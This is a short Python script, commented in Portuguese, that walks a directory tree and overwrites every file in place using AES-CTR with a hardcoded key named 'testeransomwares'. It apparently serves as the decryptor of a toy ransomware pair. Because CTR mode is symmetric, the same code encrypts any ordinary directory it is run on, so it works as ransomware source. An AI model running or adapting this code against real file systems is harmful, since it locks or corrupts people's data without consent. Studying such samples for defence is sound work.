import os
import pyaes
import argparse

# chave de criptografia
chave = b"testeransomwares"  # Ajuste para 16, 24 ou 32 bytes

def criptografa(key, input_file):
    # Abrir o arquivo a ser criptografado
    aes = pyaes.AESModeOfOperationCTR(chave)

    with open(input_file, 'rb') as fileOpen:
        file_data = fileOpen.read()

    # Criptografar o arquivo
    crypto_data = aes.decrypt(file_data)

    # Salvar o arquivo criptografado
    with open(input_file, 'wb') as fileClose:
        fileClose.write(crypto_data)

def listar_arquivos_diretorios(diretorio, diretorios_a_pular=None):
    if diretorios_a_pular is None:
        diretorios_a_pular = []

    for root, dirs, files in os.walk(diretorio):
       
       # Verifica se o diretório deve ser pulado
        if any(nome in root for nome in diretorios_a_pular):
            continue

         # Listar diretórios
        print(f"Diretório: {root}")

        # Listar arquivos
        for file in files:
            caminho_completo = os.path.join(root, file)
            criptografa(chave, caminho_completo)
            print(f"Arquivo descriptografado: {caminho_completo}")

#
if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="Descriptografa arquivos em um diretório, pulando diretórios específicos.")
    parser.add_argument('-d', '--diretorio', type=str, help='Caminho do diretório a ser descriptografado.', default=os.getcwd())
    parser.add_argument('-p', '--pular', nargs='+', help='Lista de diretórios a serem pulados.')
    parser.add_argument('-c', '--chave', type=str, help='Chave de descriptografia.')

    args = parser.parse_args()

    caminho_do_diretorio = args.diretorio
    diretorios_a_pular = args.pular if args.pular else []

    if args.chave:
        chave = args.chave.encode()

    listar_arquivos_diretorios(caminho_do_diretorio, diretorios_a_pular)